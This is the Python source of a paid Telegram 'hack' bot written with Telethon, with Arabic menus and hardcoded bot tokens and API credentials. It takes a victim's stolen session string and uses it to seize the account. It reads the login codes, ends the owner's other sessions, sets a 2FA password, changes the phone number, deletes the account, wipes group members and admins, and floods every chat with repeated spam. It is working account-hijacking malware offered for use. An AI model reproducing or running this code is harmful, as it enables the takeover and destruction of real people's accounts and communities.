#------------مكاتب--------------#
import os
import logging
from telethon import TelegramClient, events, functions, types, Button
from datetime import timedelta
import asyncio
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
#------------------------------------#





#--------معلومات تشغيل البوت--------#
token = '5573609353:AAHYF4eXVlQuirUKmoQPSNZ7i5_sKye6h-Q'
Bot_Username = 'KHATARHKbot'
#-------------------------------------------#





#------------تشغيل التيليثون---------#
api_id = 15488596
api_hash = '05977211e69e2ced6812913cd9167691'
client = TelegramClient('khatarsource', api_id, api_hash).start(bot_token=token)
mybot = "khatarstorebot"
bot = borg = client
#---------------------------------------#

#---------------اوامر الاختراق--------------#
async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await bot(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await bot(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await bot(leave("@Ids_Holder"))
    except BaseException:
      pass
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await bot(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await bot(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await bot(leave("@Ids_Holder"))
    except BaseException:
      pass
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@KHATARTEAM"))
    except BaseException:
      pass
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    try:
      await X.edit_2fa('khatarsource IS BEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    i = ""
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(join("@KHATARTEAM"))
    except BaseException:
      pass
    try:
      await X(join("@kHaTaRch"))
    except BaseException:
      pass
    try:
      await X(leave("@IndianUpdateChannel"))
    except BaseException:
      pass
    try:
      await X(leave("@Ids_Holder"))
    except BaseException:
      pass
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nاسم القناه : {x.title} \n معرف القناه : @{x.username}'
      except:
        pass
    return str(i)
#------------------------------------#


#-------------تشغيل البوت------------#
logging.basicConfig(level=logging.WARNING)

channel = "kHaTaRch"
menu = '''
• بوت تحكم كامل في حساب تيليجرام اي شخص بأستخدام StringSession •
 
 
[1]-[اظهار القنوات التي يملكها المستخدم]

[2]-[اظهار جميع معلومات المستخدم]

[3]-[تفليش اعضاء احدي قنوات/مجوعات المستخدم]

[4]- [جلب كود التحقق استخدم الامر 2 و خذ رقم الهاتف سجل بيه علي تطبيق تيليجرام وسأجلب لك كود التحقق]

[5]-[انضمام إلي قناه/مجموعه]

[6]-[مغادرة قناه/مجموعه]

[7]-[حذف قناه/مجموعه]

[8]-[فحص التحقق بخطوتين مفعل/غير مفعل]

[9]-[انهاء جميع الجلسات بأستثناء جلستك]

[10]-[حذف الحساب]

[11]-[تنزيل جميع الادمن من قناه/مجموعه]

[12]-[ترقيه عضو في قناه/مجموعه]

[13]-[تغيير رقم الهاتف]

[14]-[الاذاعه]
'''
mm = '''
**انضم للقناه اولا!!
@kHaTaRch**
'''

keyboard = [
  [  
    Button.inline("1", data="A"), 
    Button.inline("2", data="B"),
    Button.inline("3", data="C"),
    Button.inline("4", data="D"),
    Button.inline("5", data="E")
    ],
  [
    Button.inline("6", data="F"), 
    Button.inline("7", data="G"),
    Button.inline("8", data="H"),
    Button.inline("9", data="I"),
    Button.inline("10", data="J"),
    ],
  [
    Button.inline("11", data="K"), 
    Button.inline("12", data="L"),
    Button.inline("13", data="M"),
    Button.inline("14", data="N"),
    ],
  [
    Button.url("الـمـالـڪ ⸙", "https://t.me/IlIlI_x")
    ],
  [
    Button.url("تحديثات البوت", "https://t.me/kHaTaRch")
    ]
]

@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    khatarsource = [
      [
        Button.url("اضغط هنا", f"https://t.me/{Bot_Username}?start=hack")
        ],
      [
        Button.url("المالك⸙", f"https://t.me/IlIlI_x")
        ] 
      ]         
    await event.reply("عذرا لا يمكنني العمل بالمجموعات بأمر من المطور اضغط علي الزر بالاسفل لإستخدامي بشكل صحيح", buttons=khatarsource)

          
  else:
    legendbye = [
      [
        Button.url("اضغط للاشتراك", f"https://t.me/kHaTaRch")
        ]
      ]
    await event.reply("عذرا اشترك بقناه البوت اولا ثم ارسل /hack", buttons=legendbye)
    
       
@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  khatarsource = [
    [
      Button.url("اضغط هنا", f"https://t.me/{Bot_Username}")
      ],
            [
        Button.url("المالك⸙", f"https://t.me/IlIlI_x")
        ]       
    ]         
  await event.reply("عذرا لا يمكنني العمل بالمجموعات بأمر من المطور اضغط علي الزر بالاسفل لإستخدامي بشكل صحيح", buttons=khatarsource)
  
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  s = await event.get_sender()
  k = (s.username)
  global menu
  async with bot.conversation(event.chat_id) as x:
      d = ['IlIlI_x','XXXXKXKK','W_2_X']
      if k in d:
          keyboard = [
      [  
        Button.inline("1", data="A"), 
        Button.inline("2", data="B"),
        Button.inline("3", data="C"),
        Button.inline("4", data="D"),
        Button.inline("5", data="E")
        ],
      [
        Button.inline("6", data="F"), 
        Button.inline("7", data="G"),
        Button.inline("8", data="H"),
        Button.inline("9", data="I"),
        Button.inline("10", data="J")
        ],
      [
        Button.inline("11", data="K"), 
        Button.inline("12", data="L"),
        Button.inline("13", data="M"),
        Button.inline("14", data="N"),
        ],
  [
    Button.url("الـمـالـڪ ⸙", "https://t.me/IlIlI_x")
    ],
  [
    Button.url("تحديثات البوت", "https://t.me/kHaTaRch")
    ]
    ]
          await x.send_message(f"اختر ماتريد فعله بأستخدام كود الجلسه \n\n{menu}", buttons=keyboard)
      else:
          kex =   [
    Button.url("الـمـالـڪ ⸙", "https://t.me/IlIlI_x")
    ]
          await x.send_message(f"عذرا صديقي البوت مدفوع للاشتراك بالبوت راسل المالك", buttons=kex)
          
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه\n /hack", buttons=keyboard)
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("كود الجلسه هذا تم إنهائه\n/hack", buttons=keyboard)
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nبواسطه @kHaTaRch")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nشكرا علي استخدامك Khatarhackbot \n/hack", buttons=keyboard)
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ارسل كود الجلسه")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("كود الجلسه هذا تم إنهائه\n/hack", buttons=keyboard)
    i = await userinfo(strses.text)
    await event.reply(i + "\n\nكود الجلسه هذا تم إنهائه\n/hack", buttons=keyboard)
    
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ارسل كود الجلسه")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
    await x.send_message("ارسل معرف القناه/المجموعه")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("تم حظر جميع الاعضاء", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nشكرا علي استخدامك Khatarhackbot", buttons=keyboard)
    
      
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ارسل كود الجلسه")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
    await x.send_message("ارسل معرف القناه/المجموعه")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("تم الانضمام", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    await x.send_message("ارسل كود الجلسه")
    strses = await x.get_response()
    op = await cu(strses.text)
    if op:
      pass
    else:
      return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
    await x.send_message("ارسل معرف القناه/المجوعه")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("تمت المغادرة", buttons=keyboard)
@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      await x.send_message("ارسل معرف القناه/المجموعه")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("تم الحذف", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      i = await user2fa(strses.text)
      if i:
        await event.reply("المستخدم غير مفعل التحقق بخطوتين يمكنك تسجيل الدخول الان بأستخدام البوت", buttons=keyboard)
      else:
        await event.reply("عذرا المستخدم مفعل التحقق بخطوتين", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      i = await terminate(strses.text)
      await event.reply("تم إنهاء جميع الجلسات", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      i = await delacc(strses.text)
      await event.reply("تم حذف الحساب بنجاح", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      await x.send_message("ارسل معرف القناه/المجموعه")
      grp = await x.get_response()
      await x.send_message("ارسل معرف المستخدم الذي تريد ترقيته")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("يتم ترقيه المستخدم الان", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      await x.send_message("ارسل معرف القناه/المجموعه")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("يتم تنزيل الجميع", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      await x.send_message("ارسل رقم الهاتف الان\n لاتستخدم تطبيقات الارقام المزيفه")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n انسخ رمز الجلسه هذا وسألطلبه منك بعد 20 ثانيه")
        await asyncio.sleep(20)
        await x.send_message("الان ارسل رمز الجلسه")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("الان ارسل كود التحقق")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("تم تغيير الرقم بنجاح")
        else:
          await event.respond("خطأ حدثت مشكله اثناء تغيير الرقم")
      except Exception as e:
        await event.respond("ارسل الخطأ إلي - @KHATARTEAM\n**LOGS**\n" + str(e))



@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
async def start(event):
    keyboard = [
      [  
        Button.inline("اذاعه للكل", data="a"), 
        Button.inline("اذاعه بالمجموعات", data="b"),
        Button.inline("اذاعه بالخاص", data="c"),
        ],
  [
    Button.url("الـمـالـک", "https://t.me/IlIlI_x")
    ],
  [
    Button.url("تحديثات البوت", "https://t.me/kHaTaRch")
    ]
    ]
    await event.reply("  الان اختر ماذا تريد من الاسفل", buttons=keyboard)



async def gcasta(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for aman in X.iter_dialogs():
                chat = aman.id
                try:
                    await X.send_message(chat, tol, file=file)     
                    if lol != -1001551357238:
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                        await asyncio.sleep(60)
                        await X.send_message(chat, tol, file=file)
                    elif chat == -1001606996743:
                        pass
                    await asyncio.sleep()
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)        


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"a")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      await x.send_message("ارسل الرساله الان")
      msg = await x.get_response()
      await x.send_message("يتم الآن إرسال رسالة تلقائيًا كل 10 دقائق لتجب الحظر")
      i = await gcasta(strses.text, msg.text)
      await event.reply(f"تمت الاذاعه الان  {i} الكل", buttons=keyboard)

molb = True

async def gcastb(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for sweetie in X.iter_dialogs():
                if sweetie.is_group:
                    chat = sweetie.id
                    try:
                        if chat != -1001606996743:
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(600)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            await asyncio.sleep(60)
                            await X.send_message(chat, tol, file=file)
                            while molb != False:
                                await asyncio.sleep(600)
                                await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
                        elif chat == -1001606996743:
                            pass
                    except Exception as e:
                        print(e)
        except Exception as e:
            print(e)


@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"b")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("كود الجلسه هذا تم إنهائه", buttons=keyboard)
      await x.send_message("ارسل رساله الاذاعه الان")
      msg = await x.get_response()
      await x.send_message("يتم الان ارسال رساله تلقائيه كل 10 دقائق")
      i = await gcastb(strses.text, msg.text)
      await event.reply(f"تم الاذاعه في {i} مجموعه", buttons=keyboard)

async def gcastc(strses, msg):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            reply_msg = msg
            tol = reply_msg
            file = None
            async for krishna in X.iter_dialogs():
                if krishna.is_user and not krishna.entity.bot:
                    chat = krishna.id
                    try:
                        await X.send_message(chat, tol, file=file)
                        while molc != False:
                            await asyncio.sleep(10)
                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
                    except BaseException:
                        pass
        except Exception as e:
            print(e)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("ارسل كود الجلسه")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("ارسل كود الجلسه", buttons=keyboard)
      await x.send_message("ارسل رساله الاذاعه")
      msg = await x.get_response()
      await x.send_message("يتم الان ارسال الرساله تلقائيا كل 10 دقائق")
      i = await gcastc(strses.text, msg.text)
      await event.reply(f"تم الاذاعه لـ{i} مستخدم", buttons=keyboard)

print("✨ STARTED ✨")
client.run_until_disconnected()
#------------------------------------#
